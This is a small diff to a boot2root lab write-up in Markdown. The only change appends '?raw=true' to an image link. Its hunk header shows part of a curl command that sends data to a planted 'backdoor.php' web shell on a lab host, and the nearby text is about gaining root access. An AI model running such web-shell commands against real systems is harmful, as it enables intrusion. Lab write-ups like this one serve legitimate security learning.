@@ -69,7 +69,7 @@ curl "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-
 
 ### Alternative Method to Gain Root Access
 #### Note from the Subject
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/1.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/1.png?raw=true)
 
 Let's explore what the user has access to.
 
